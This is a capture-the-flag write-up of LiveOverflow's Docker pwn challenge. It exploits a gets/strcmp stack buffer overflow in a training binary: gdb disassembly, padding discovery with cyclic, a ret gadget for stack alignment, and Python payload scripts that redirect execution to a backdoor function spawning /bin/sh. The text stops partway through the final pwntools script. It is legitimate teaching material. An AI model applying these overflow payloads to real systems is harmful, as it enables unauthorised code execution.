---
title: Docker CTF LiveOverflow Challenge
author: pwndumb
date: 2020-11-27 14:10:00 +0800
categories: [Pwn,Linux]
tags: [linux,pwn,docker]
---
# Synopsis

The application has a **Buffer overflow** vulnerability  in  **gets** function. When I reach  buffer overflow, I'm able to redirect the flow for  **backdoor** function that has **system call** with **/bin/sh** as argument. 

> 10 min read.

## Skills Required

- Use of debugger like gdb
- pwntools 101
- Linux sockets
- Linux beginner skills

## Skills Learned

- Format String Vulnerability
- Buffer Overflow 
- Fuzz the application
- Examine memory layout in debugger
- Examine memory layout in linux process
- Control Return address
- Construct the final payload



# The Vulnerable application 


## Disassemble the program in `GDB`


Following the tutorial in the GitHub page, I set up the docker container with vulnerable application. To connect I just type `nc 127.0.0.1 1024` and receive the following instructions:



```bash
~/D/p/challenge ❯❯❯ nc -nv 127.0.0.1 1024
Connection to 127.0.0.1 port 1024 [tcp/*] succeeded!
Enter password to get system details:
```



Lets check the application running the necessary tools in docker was I created to Binary Exploitation:

```bash
[*] '/pwd/system_health_check'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



So, let me explain what  that means:

- RELRO:  Partial RERO: Partial RELRO is default in gcc. Relocation Read-Only is a security measure that makes some binary section in read-only mode. There are two modes: Full and Partial.   Partial RELRO that means the *GOT* to come before the *BSS* in memory. I  can't overflow on a global variable to overwrite the *GOT* . 
- Stack: No Canary found mean s I can overwrite the *instruction pointer* to create a *buffer overflow* . 
- NX: NX Enabled means I can't put my shellcode in stack because  non executable flag is set. 

 

Examine the program in `gdb` I discovered some useful information. Lets dive inside the debugger.

```bash
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004012de <+0>:	push   rbp
   0x00000000004012df <+1>:	mov    rbp,rsp
   0x00000000004012e2 <+4>:	sub    rsp,0x10
   0x00000000004012e6 <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004012e9 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004012ed <+15>:	mov    eax,0x0
   0x00000000004012f2 <+20>:	call   0x4011a2 <ignore_me_init_buffering>
   0x00000000004012f7 <+25>:	mov    eax,0x0
   0x00000000004012fc <+30>:	call   0x401232 <ignore_me_init_signal>
   0x0000000000401301 <+35>:	mov    eax,0x0
   0x0000000000401306 <+40>:	call   0x401267 <remote_system_health_check>
   0x000000000040130b <+45>:	nop
   0x000000000040130c <+46>:	leave
   0x000000000040130d <+47>:	ret
End of assembler dump.
pwndbg>
```

There are three functions. I will ignore the functions starting with `ignore` and focus in `remote_system_health_check`:

```bash
pwndbg> disassemble remote_system_health_check
Dump of assembler code for function remote_system_health_check:
   0x0000000000401267 <+0>:	push   rbp
   0x0000000000401268 <+1>:	mov    rbp,rsp
   0x000000000040126b <+4>:	sub    rsp,0x100
   0x0000000000401272 <+11>:	lea    rdi,[rip+0xdc7]        # 0x402040
   0x0000000000401279 <+18>:	call   0x401040 <puts@plt>
   0x000000000040127e <+23>:	lea    rax,[rbp-0x100]
   0x0000000000401285 <+30>:	mov    rdi,rax
   0x0000000000401288 <+33>:	mov    eax,0x0
   0x000000000040128d <+38>:	call   0x4010a0 <gets@plt>
   0x0000000000401292 <+43>:	lea    rax,[rbp-0x100]
   0x0000000000401299 <+50>:	lea    rsi,[rip+0xdc7]        # 0x402067
   0x00000000004012a0 <+57>:	mov    rdi,rax
   0x00000000004012a3 <+60>:	call   0x401080 <strcmp@plt>
   0x00000000004012a8 <+65>:	test   eax,eax
   0x00000000004012aa <+67>:	jne    0x4012c6 <remote_system_health_check+95>
   0x00000000004012ac <+69>:	lea    rdi,[rip+0xdca]        # 0x40207d
   0x00000000004012b3 <+76>:	call   0x401040 <puts@plt>
   0x00000000004012b8 <+81>:	lea    rdi,[rip+0xdce]        # 0x40208d
   0x00000000004012bf <+88>:	call   0x401050 <system@plt>
   0x00000000004012c4 <+93>:	jmp    0x4012dc <remote_system_health_check+117>
   0x00000000004012c6 <+95>:	lea    rdi,[rip+0xdcc]        # 0x402099
   0x00000000004012cd <+102>:	call   0x401040 <puts@plt>
   0x00000000004012d2 <+107>:	mov    edi,0x0
   0x00000000004012d7 <+112>:	call   0x401030 <_exit@plt>
   0x00000000004012dc <+117>:	leave
   0x00000000004012dd <+118>:	ret
End of assembler dump.
pwndbg>
```

Looking the function in line `+38` call `gets@plt` and in line `+60` call `strcmp@plt`.  The line `+65` check the result of `strcmp@plt` with `test eax,eax`. If the tests is false , the line `+76` call `system@plt` with `exit` system call number. Otherwise  the program goes to `+95` for set the arguments os `puts` function an exit.



## The `backdoor` function



Looking the program in `gdb` I found one interesting function named `backdoor`:

```bash
pwndbg> i functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  _exit@plt
0x0000000000401040  puts@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  alarm@plt
0x0000000000401080  strcmp@plt
0x0000000000401090  signal@plt
0x00000000004010a0  gets@plt
0x00000000004010b0  setvbuf@plt
0x00000000004010c0  _start
0x00000000004010f0  _dl_relocate_static_pie
0x0000000000401100  deregister_tm_clones
0x0000000000401130  register_tm_clones
0x0000000000401170  __do_global_dtors_aux
0x00000000004011a0  frame_dummy
0x00000000004011a2  ignore_me_init_buffering
0x0000000000401203  kill_on_timeout
0x0000000000401232  ignore_me_init_signal
0x0000000000401254  backdoor
0x0000000000401267  remote_system_health_check
0x00000000004012de  main
0x0000000000401310  __libc_csu_init
0x0000000000401370  __libc_csu_fini
0x0000000000401374  _fini
pwndbg>
```



```bash
pwndbg> disassemble backdoor
Dump of assembler code for function backdoor:
   0x0000000000401254 <+0>:	push   rbp
   0x0000000000401255 <+1>:	mov    rbp,rsp
   0x0000000000401258 <+4>:	lea    rdi,[rip+0xdd8]        # 0x402037
   0x000000000040125f <+11>:	call   0x401050 <system@plt>
   0x0000000000401264 <+16>:	nop
   0x0000000000401265 <+17>:	pop    rbp
   0x0000000000401266 <+18>:	ret
End of assembler dump.
pwndbg> x/x 0x402037
0x402037:	0x6e69622f
pwndbg> x/s 0x402037
0x402037:	"/bin/sh"
pwndbg>
```



:smile: Very interesting.  The backdoor functions call system with `/bin/sh`  as argument.  If I can get buffer overflow, I will be able to redirect the program for this functions and get my :shell:.  

## The Problem 



This is most difficult to me understand.  When I try to overflow the program sending a big string, I'm not reach a buffer overflow.This was frustrating. After while, I decide to come back to assembly code and finally discovery whats happening. 

The trick wraps  *strcmp* and *gets*. Reading the man page of both and after a lot of try and erros I finally understating what is going on. According man page of *gets* 



> ```bash
> The fgets() function reads at most one less than the number of characters specified by size from the given stream and stores them in the string str.  Reading stops when a newline character is found, at end-of-file or error.  The newline, if any, is retained.  If any characters are read and there is no error, a `\0' character is appended to end the string.
> 
> The gets() function is equivalent to fgets() with an infinite size and a stream of stdin, except that the newline character (if any) is not stored in the string.  It is
> the caller's responsibility to ensure that the input line, if any, is sufficiently short to fit in the string.
> ```

And the man page of *strcmp*:

>```bash
>The strcmp() and strncmp() functions lexicographically compare the null-terminated strings s1 and s2.
>The strncmp() function compares not more than n characters.  Because strncmp() is designed for comparing strings rather than binary data, characters that appear after a
>`\0' character are not compared.
>```



So, for the get a buffer overflow I have to send the correct password (I already known because I saw in `gdb`.) and exploit the difference between *gets* and *strcmp*.  One stop before `
` and other before `\x0`.  

# The Exploit 



##  Buffer Overflow 



First thing is know the padding of buffer that allow me control  point*.  Let me write a simple python code for this:

```python
def main():
    
    # creating payload
    #     
    
    payload=[
        b"sUp3r_S3cr3T_P4s5w0rD\x00",
        b"A" * 300
        
    ]
    
    payload=b"".join(payload)
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()
```



Running the script I reach a `buffer overflow`.

```python
┌[root☮2d6562dcd579]-(/pwd)
└> python3 asd.py | ./system_health_check
Enter password to get system details:

Access Granted

top - 16:19:14 up 58 min,  0 users,  load average: 0.13, 0.06, 0.01
Tasks:   5 total,   1 running,   4 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  1.7 sy,  0.0 ni, 98.3 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1987.5 total,   1000.9 free,    329.5 used,    657.1 buff/cache
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1492.0 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0    4184   2956   2736 S   0.0   0.1   0:00.02 bash
    7 root      20   0   11200   6976   4780 S   0.0   0.3   0:01.76 zsh
  425 root      20   0    2340   1328   1252 S   0.0   0.1   0:00.00 system_health_c
  426 root      20   0    2588    740    664 S   0.0   0.0   0:00.00 sh
  427 root      20   0    7040   3412   2984 R   0.0   0.2   0:00.00 top
[1]    424 done                python3 asd.py |
       425 segmentation fault  ./system_health_check
```



Let's do this inside `gdb`. For this I change the python script for send `150 A's`, `100 B's`  and `50 C's`. Save the output in file with redirect and attach the program in `gdb`:

<img src="https://raw.githubusercontent.com/pwndumb/pwndumb.github.io/master/assets/img/commons/docker-ctf-liveoverflow-challenge/hexyl%20payload.png" alt="Payload in hexadecimal" style="zoom:67%;" />



```bash
pwndbg> disassemble remote_system_health_check
Dump of assembler code for function remote_system_health_check:
   0x0000000000401267 <+0>:	push   rbp
   0x0000000000401268 <+1>:	mov    rbp,rsp
   0x000000000040126b <+4>:	sub    rsp,0x100
   0x0000000000401272 <+11>:	lea    rdi,[rip+0xdc7]        # 0x402040
   0x0000000000401279 <+18>:	call   0x401040 <puts@plt>
   0x000000000040127e <+23>:	lea    rax,[rbp-0x100]
   0x0000000000401285 <+30>:	mov    rdi,rax
   0x0000000000401288 <+33>:	mov    eax,0x0
   0x000000000040128d <+38>:	call   0x4010a0 <gets@plt>
   0x0000000000401292 <+43>:	lea    rax,[rbp-0x100]
   0x0000000000401299 <+50>:	lea    rsi,[rip+0xdc7]        # 0x402067
   0x00000000004012a0 <+57>:	mov    rdi,rax
   0x00000000004012a3 <+60>:	call   0x401080 <strcmp@plt>
   0x00000000004012a8 <+65>:	test   eax,eax
   0x00000000004012aa <+67>:	jne    0x4012c6 <remote_system_health_check+95>
   0x00000000004012ac <+69>:	lea    rdi,[rip+0xdca]        # 0x40207d
   0x00000000004012b3 <+76>:	call   0x401040 <puts@plt>
   0x00000000004012b8 <+81>:	lea    rdi,[rip+0xdce]        # 0x40208d
   0x00000000004012bf <+88>:	call   0x401050 <system@plt>
   0x00000000004012c4 <+93>:	jmp    0x4012dc <remote_system_health_check+117>
   0x00000000004012c6 <+95>:	lea    rdi,[rip+0xdcc]        # 0x402099
   0x00000000004012cd <+102>:	call   0x401040 <puts@plt>
   0x00000000004012d2 <+107>:	mov    edi,0x0
   0x00000000004012d7 <+112>:	call   0x401030 <_exit@plt>
   0x00000000004012dc <+117>:	leave
   0x00000000004012dd <+118>:	ret
End of assembler dump.
pwndbg> b *remote_system_health_check + 38
Breakpoint 1 at 0x40128d
```



```bash
pwndbg> r < a.txt
Starting program: /pwd/system_health_check < a.txt
Enter password to get system details:


Breakpoint 1, 0x000000000040128d in remote_system_health_check ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────
 RBX  0x0
 RCX  0x7ffff7edcd57 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7fffffffe480 ◂— 0x0
 RSI  0x7ffff7fb8743 (_IO_2_1_stdout_+131) ◂— 0xfba690000000000a /* '
' */
 R8   0x27
 R9   0x0
 R10  0x7ffff7fef5a0 ◂— pxor   xmm0, xmm0
 R11  0x246
 R12  0x4010c0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffe580 —▸ 0x7fffffffe5a0 —▸ 0x401310 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffe480 ◂— 0x0
 RIP  0x40128d (remote_system_health_check+38) ◂— call   0x4010a0
───────────────────[ DISASM ]────────────────────────────────────────────────────
 ► 0x40128d <remote_system_health_check+38>    call   gets@plt <gets@plt>
        rdi: 0x7fffffffe480 ◂— 0x0
        rsi: 0x7ffff7fb8743 (_IO_2_1_stdout_+131) ◂— 0xfba690000000000a /* '
' */
        rdx: 0x0
        rcx: 0x7ffff7edcd57 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */

   0x401292 <remote_system_health_check+43>    lea    rax, [rbp - 0x100]
   0x401299 <remote_system_health_check+50>    lea    rsi, [rip + 0xdc7]
   0x4012a0 <remote_system_health_check+57>    mov    rdi, rax
   0x4012a3 <remote_system_health_check+60>    call   strcmp@plt <strcmp@plt>

   0x4012a8 <remote_system_health_check+65>    test   eax, eax
   0x4012aa <remote_system_health_check+67>    jne    remote_system_health_check+95 <remote_system_health_check+95>

   0x4012ac <remote_system_health_check+69>    lea    rdi, [rip + 0xdca]
   0x4012b3 <remote_system_health_check+76>    call   puts@plt <puts@plt>

   0x4012b8 <remote_system_health_check+81>    lea    rdi, [rip + 0xdce]
   0x4012bf <remote_system_health_check+88>    call   system@plt <system@plt>
───────────────────────────────[ STACK ]────────────────────────────
00:0000│ rdi rsp  0x7fffffffe480 ◂— 0x0
... ↓
──────────────────[ BACKTRACE ]──────────────────────────────────────────
 ► f 0           40128d remote_system_health_check+38
   f 1           40130b main+45
   f 2     7ffff7dfccb2 __libc_start_main+242
───────────────────────────────────────────────────────────────────────
pwndbg>
```

 Set another breakpoint in `strcmp` (`remote_system_health_check+60>`) an type `c`:

```bash
► 0x4012a3 <remote_system_health_check+60>    call   strcmp@plt <strcmp@plt>
        s1: 0x7fffffffe480 ◂— 'sUp3r_S3cr3T_P4s5w0rD'
        s2: 0x402067 ◂— 'sUp3r_S3cr3T_P4s5w0rD'

   0x4012a8 <remote_system_health_check+65>    test   eax, eax
   0x4012aa <remote_system_health_check+67>    jne    remote_system_health_check+95 <remote_system_health_check+95>

   0x4012ac <remote_system_health_check+69>    lea    rdi, [rip + 0xdca]
   0x4012b3 <remote_system_health_check+76>    call   puts@plt <puts@plt>

   0x4012b8 <remote_system_health_check+81>    lea    rdi, [rip + 0xdce]
   0x4012bf <remote_system_health_check+88>    call   system@plt <system@plt>
────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────
00:0000│ rax rdi r8 rsp  0x7fffffffe480 ◂— 'sUp3r_S3cr3T_P4s5w0rD'
01:0008│                 0x7fffffffe488 ◂— 'cr3T_P4s5w0rD'
02:0010│                 0x7fffffffe490 ◂— 0x4141004472307735 /* '5w0rD' */
03:0018│                 0x7fffffffe498 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓
──────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────
 ► f 0           4012a3 remote_system_health_check+60
   f 1 4242424242424242
   f 2 4343434343434343
   f 3 4343434343434343
   f 4 4343434343434343
   f 5 4343434343434343
   f 6 4343434343434343
   f 7 4343434343434343
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```



The string `s1` and `s2` are equal, so the program will follow the normal flow reach the `remote_system_health_check+69` .  Lets type `c` again: 



```bash
pwndbg> c
Continuing.
Access Granted

[Attaching after process 568 vfork to child process 572]
[New inferior 2 (process 572)]
[Detaching vfork parent process 568 after child exec]
[Inferior 1 (process 568) detached]
process 572 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "remote_system_health_check" in current context.
Error in re-setting breakpoint 2: No symbol "remote_system_health_check" in current context.
[Attaching after process 572 fork to child process 573]
[New inferior 3 (process 573)]
[Detaching after fork from parent process 572]
[Inferior 2 (process 572) detached]
Error in re-setting breakpoint 1: No symbol "remote_system_health_check" in current context.
Error in re-setting breakpoint 2: No symbol "remote_system_health_check" in current context.
process 573 is executing new program: /usr/bin/top
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "remote_system_health_check" in current context.
Error in re-setting breakpoint 2: No symbol "remote_system_health_check" in current context.
Error in re-setting breakpoint 1: No symbol "remote_system_health_check" in current context.
Error in re-setting breakpoint 2: No symbol "remote_system_health_check" in current context.
top - 16:36:57 up  1:16,  0 users,  load average: 0.10, 0.07, 0.02
Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie
%Cpu(s):  2.9 us,  1.5 sy,  0.0 ni, 95.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1987.5 total,    944.3 free,    370.1 used,    673.1 buff/cache
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1455.0 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0    4184   2956   2736 S   0.0   0.1   0:00.03 bash
    7 root      20   0   11200   7088   4892 S   0.0   0.3   0:02.07 zsh
  565 root      20   0  119328  72952  31284 S   0.0   3.6   0:01.34 gdb
  568 root      20   0    2340   1396   1296 S   0.0   0.1   0:00.00 system_health_c
  572 root      20   0    2588    872    772 S   0.0   0.0   0:00.00 sh
  573 root      20   0    7040   3524   3072 R   0.0   0.2   0:00.00 top
[Inferior 3 (process 573) exited normally]
pwndbg>
```



Ops. Nothing of buffer overflow.  Why ? The answer is in the first lines - The `gdb` is in `child` follow fork mode. In few words, the `gdb` attach I new process that is `top  ` command and follow  them.  I  must type `set follow-fork-mode parent` inside `gdb`  and repeat the process again:



```bash
pwndbg> set follow-fork-mode parent
pwndbg>
pwndbg> r < a.txt
Starting program: /pwd/system_health_check < a.txt
Enter password to get system details:

Access Granted

[Detaching after vfork from child process 596]
top - 16:42:28 up  1:21,  0 users,  load average: 0.00, 0.04, 0.01
Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  0.0 sy,  0.0 ni,100.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1987.5 total,    949.3 free,    365.0 used,    673.2 buff/cache
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1460.2 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0    4184   2956   2736 S   0.0   0.1   0:00.03 bash
    7 root      20   0   11200   7088   4892 S   0.0   0.3   0:02.07 zsh
  589 root      20   0   96764  63652  27416 S   0.0   3.1   0:00.62 gdb
  592 root      20   0    2340   1396   1296 S   0.0   0.1   0:00.00 system_health_c
  596 root      20   0    2588    680    608 S   0.0   0.0   0:00.00 sh
  597 root      20   0    7040   3504   3080 R   0.0   0.2   0:00.00 top

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012dd in remote_system_health_check ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0x2
 RSI  0x7fffffffe150 ◂— 0x0
 R8   0x7fffffffe150 ◂— 0x0
 R9   0x0
 R10  0x8
 R11  0x246
 R12  0x4010c0 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x4242424242424242 ('BBBBBBBB')
 RSP  0x7fffffffe588 ◂— 'BBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
 RIP  0x4012dd (remote_system_health_check+118) ◂— ret
───────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────
 ► 0x4012dd <remote_system_health_check+118>    ret    <0x4242424242424242>
────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ rsp  0x7fffffffe588 ◂— 'BBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
01:0008│      0x7fffffffe590 ◂— 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
... ↓
07:0038│      0x7fffffffe5c0 ◂— 0x4343 /* 'CC' */
──────────────────────────────[ BACKTRACE ]─────────────
 ► f 0           4012dd remote_system_health_check+118
   f 1 4242424242424242
   f 2 4343434343434343
   f 3 4343434343434343
   f 4 4343434343434343
   f 5 4343434343434343
   f 6 4343434343434343
   f 7 4343434343434343

pwndbg>
```



Bumm. Buffer overflow 🎉.   



## The Padding



For this I will use cyclic command from pwntools inside `gdb`:

```bash
pwndbg> cyclic 300
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
```

Modified python script:

```python
#!/usr/bin/python
import socket
import struct
import sys

def main():
    
    # creating payload
    #     
    
    payload=[
        b"sUp3r_S3cr3T_P4s5w0rD\x00",
        b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"
    ]
    
    payload=b"".join(payload)
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()

```



Running the script I  have:

```bash
 RSP  0x7fffffffe588 ◂— 'aclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
 RIP  0x4012dd (remote_system_health_check+118) ◂— ret
─────────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x4012dd <remote_system_health_check+118>    ret    <0x616d6361616c6361>
 pwndbg> cyclic -l acla
242
pwndbg>
```

Lets check  this again. Now send `242 A's` and `8 B's`:

```bash
┌[root☮2d6562dcd579]-(/pwd)
└> python3 asd.py > a.txt
┌[root☮2d6562dcd579]-(/pwd)
└> hexyl a.txt
┌────────┬─────────────────────────┬─────────────────────────┬────────┬────────┐
│00000000│ 73 55 70 33 72 5f 53 33 ┊ 63 72 33 54 5f 50 34 73 │sUp3r_S3┊cr3T_P4s│
│00000010│ 35 77 30 72 44 00 41 41 ┊ 41 41 41 41 41 41 41 41 │5w0rD0AA┊AAAAAAAA│
│00000020│ 41 41 41 41 41 41 41 41 ┊ 41 41 41 41 41 41 41 41 │AAAAAAAA┊AAAAAAAA│
│*       │                         ┊                         │        ┊        │
│00000100│ 41 41 41 41 41 41 41 41 ┊ 42 42 42 42 42 42 42 42 │AAAAAAAA┊BBBBBBBB│
└────────┴─────────────────────────┴─────────────────────────┴────────┴────────┘

```

```bash
 RSP  0x7fffffffe588 ◂— 'BBBBBBBB'
 RIP  0x4012dd (remote_system_health_check+118) ◂— ret
──────────────────────────[ DISASM ]─────────────────────────────────────────────────────
 ► 0x4012dd <remote_system_health_check+118>    ret    <0x4242424242424242>



───────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ rsp  0x7fffffffe588 ◂— 'BBBBBBBB'
01:0008│      0x7fffffffe590 —▸ 0x7fffffffe600 ◂— 0x6bb013aaf29a6ece
```



# Final Exploit



## Another pitfall 



The necessary knowledge for write a exploit that  already have. Lets check this:

- [x] reach buffer overflow
- [x] control RIP
- [x] A function with system call `/bin/sh`



Seems everything is right.  Let me running the script:

```python
#!/usr/bin/python
import socket
import struct
import sys

def main():
    
    # creating payload
    #     
    RIP = struct.pack("<L",0x401254)
    
    payload=[
        b"sUp3r_S3cr3T_P4s5w0rD\x00",
        b"A" * 242,
        RIP  
    ]
    
    payload=b"".join(payload)
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()

```

 Before, put a breakpoint in `backdoor` function:

```bash
pwndbg> disassemble backdoor
Dump of assembler code for function backdoor:
   0x0000000000401254 <+0>:	push   rbp
   0x0000000000401255 <+1>:	mov    rbp,rsp
   0x0000000000401258 <+4>:	lea    rdi,[rip+0xdd8]        # 0x402037
   0x000000000040125f <+11>:	call   0x401050 <system@plt>
   0x0000000000401264 <+16>:	nop
   0x0000000000401265 <+17>:	pop    rbp
   0x0000000000401266 <+18>:	ret
End of assembler dump.
pwndbg> b *backdoor
Breakpoint 1 at 0x401254
pwndbg>
```



```bash
pwndbg> r < a.txt
Starting program: /pwd/system_health_check < a.txt
Enter password to get system details:

Access Granted

[Detaching after vfork from child process 1012]
top - 17:15:54 up  1:55,  0 users,  load average: 0.03, 0.09, 0.05
Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.0 us,  1.6 sy,  0.0 ni, 98.4 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1987.5 total,    943.3 free,    370.5 used,    673.7 buff/cache
MiB Swap:   1024.0 total,   1024.0 free,      0.0 used.   1460.1 avail Mem

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0    4184   2956   2736 S   0.0   0.1   0:00.03 bash
    7 root      20   0   11200   7088   4892 S   0.0   0.3   0:02.39 zsh
 1005 root      20   0   96780  63776  27508 S   0.0   3.1   0:00.66 gdb
 1008 root      20   0    2340   1396   1296 S   0.0   0.1   0:00.00 system_health_c
 1012 root      20   0    2588    680    608 S   0.0   0.0   0:00.00 sh
 1013 root      20   0    7040   3504   3080 R   0.0   0.2   0:00.00 top

Breakpoint 1, 0x0000000000401254 in backdoor ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
```



I  have success in redirect flow execution of program. Type `c` to continue:

 ````bash
pwndbg> c
Continuing.

Program received signal SIGALRM, Alarm clock.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e23f82 in do_system (line=0x402037 "/bin/sh") at ../sysdeps/posix/system.c:148
148	../sysdeps/posix/system.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
*RAX  0x7ffff7fbb600 (environ) —▸ 0x7fffffffe6a8 —▸ 0x7fffffffe8bb ◂— 'HOSTNAME=2d6562dcd579'
*RBX  0x402037 ◂— 0x68732f6e69622f /* '/bin/sh' */
*RCX  0x7fffffffe3f8 ◂— 0xc /* '\x0c' */
 RDX  0x0
*RDI  0x7fffffffe1f4 ◂— 0x0
*RSI  0x7ffff7f8241f ◂— 0x68732f6e69622f /* '/bin/sh' */
*R8   0x7fffffffe238 ◂— 0x0
*R9   0x7fffffffe6a8 —▸ 0x7fffffffe8bb ◂— 'HOSTNAME=2d6562dcd579'
 R10  0x8
 R11  0x246
*R12  0x7fffffffe258 ◂— 0x0
 R13  0x0
 R14  0x0
 R15  0x0
*RBP  0x7fffffffe3f8 ◂— 0xc /* '\x0c' */
*RSP  0x7fffffffe1e8 ◂— 0x0
*RIP  0x7ffff7e23f82 (do_system+370) ◂— movaps xmmword ptr [rsp + 0x50], xmm0
───────────────────────────────────────[ DISASM ]────────────────────────────────
 ► 0x7ffff7e23f82 <do_system+370>    movaps xmmword ptr [rsp + 0x50], xmm0
   0x7ffff7e23f87 <do_system+375>    mov    qword ptr [rsp + 0x68], 0
   0x7ffff7e23f90 <do_system+384>    call   posix_spawn <posix_spawn>
 ````



The program crash and I don't have my shell yet.  After some less hair in my head, I finally found what I'm missing. 

Google it  ` movaps xmmword ptr [rsp + 0x50], xmm0`   gave me the answer .



> Recently, I want to modify the binary program which add a instruction `push $rbx` in the binary program. And it will increment the stack by 8 bytes. It sounds good for the binary program.
>
> And I debug the modified binary with gdb, and find that it crashes in `movaps` instruction.
>
> ```bash
> movaps xmmword ptr [rsp+0x50], xmm0
> ```
>
> So what happened?
>
> And I found the answers from some blogs(see [reference](http://blog.binpang.me/2019/07/12/stack-alignment/#reference)). `movaps` is “move aligned packed single-precision floating-point values”. If the instruction’s operand is memory, the memory address must be aligned to 16 bytes. And I print the `$rsp+0x50`, its not 16 bytes alignment. That’s because I pushed `$rbx` into the stack and increment the rsp to 8 bytes, and that results in rsp is not aligned to 16 byte
>
> 



So I have to aligned the stack before call *backdoor* function. What instruction do that its for me ? The `RET` instruction does this for me. Let me found one:

```bash
python3 ROPgadget.py  --only "ret" --binary /pwd/system_health_check
Gadgets information
============================================================
0x0000000000401016 : ret
0x0000000000401072 : ret 0x2f
0x000000000040127a : ret 0xfffd

Unique gadgets found: 3
```

> By the way,  this is a gadgets.



Pick up the first, put before call our `backdoor` function and get a shell.

## Functional Exploit 

For the functional  exploit, I  used `pwntools` that gave more focus in binary exploitation part and less in python stuff. 

```python
#!/usr/bin/python
from pwn import *


def main():
    
    # padding + RET + RIP    
    
    padding = b"A"* 242
